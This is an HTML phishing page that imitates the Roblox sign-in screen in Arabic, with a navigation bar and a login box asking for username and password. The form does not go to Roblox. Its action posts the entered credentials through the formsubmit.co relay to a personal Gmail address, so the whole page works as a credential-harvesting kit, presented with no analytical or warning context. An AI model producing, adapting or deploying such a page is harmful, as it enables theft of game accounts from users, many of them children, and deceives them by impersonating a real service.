<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}
.navbar{
  background:linear-gradient(#1a1a1a,#0f0f0f);
  height:64px;
  display:flex;
  align-items:center;
  padding:0 18px;
}
.logo{font-size:24px;font-weight:900;margin-right:20px;}
.links{display:flex;gap:18px;}
.links a{color:#ddd;text-decoration:none;font-size:14px;}
.links a:hover{color:white}
.search{
  margin:auto;
  display:flex;
  align-items:center;
  background:#222;
  border-radius:10px;
  padding:6px 14px;
  width:420px;
}
.search input{
  background:transparent;
  border:none;
  color:white;
  outline:none;
  width:100%;
}
.actions{
  margin-left:auto;
  display:flex;
  gap:10px;
}
.btn-blue,.btn-dark{
  width:120px;
  padding:8px 0;
  border-radius:8px;
  font-weight:bold;
}
.btn-blue{background:#2a7cff;border:none;color:white;}
.btn-dark{background:#111;border:1px solid #555;color:white;}
.bg{
  background:url("IMG_0161.png") center/cover no-repeat;
  min-height:calc(100vh - 64px);
  display:flex;
  justify-content:center;
  align-items:center;
}
.box{
  background:rgba(35,38,47,0.95);
  width:380px;
  padding:25px;
  border-radius:14px;
}
.box h2{text-align:center;}
.box input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  background:#2f3340;
  color:white;
}
.mainbtn{
  width:100%;
  padding:12px;
  background:#2a7cff;
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
}
.sec{
  width:100%;
  padding:12px;
  background:#2f3340;
  border:none;
  border-radius:8px;
  color:white;
  margin-top:10px;
}
.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
.line{height:1px;background:#444;margin:15px 0;}
</style>
</head>

<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>
  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>
  <div class="search">
    <input type="text" placeholder="بحث">
  </div>
  <div class="actions">
    <button class="btn-blue">تسجيل الدخول</button>
    <button class="btn-dark">تسجيل</button>
  </div>
</div>

<div class="bg">
  <form class="box" action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">

    <h2>تسجيل الدخول إلى Roblox</h2>

    <input type="text" name="username" placeholder="اسم المستخدم" required>
    <input type="password" name="password" placeholder="كلمة المرور" required>

    <button type="submit" class="mainbtn">تسجيل الدخول</button>

    <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
    <div class="line"></div>

    <button type="button" class="sec">إرسال رمز لمرة واحدة عبر البريد</button>
    <button type="button" class="sec">تسجيل دخول سريع</button>

    <div class="small">ليس لديك حساب؟ اشترك</div>

  </form>
</div>

</body>
</html>
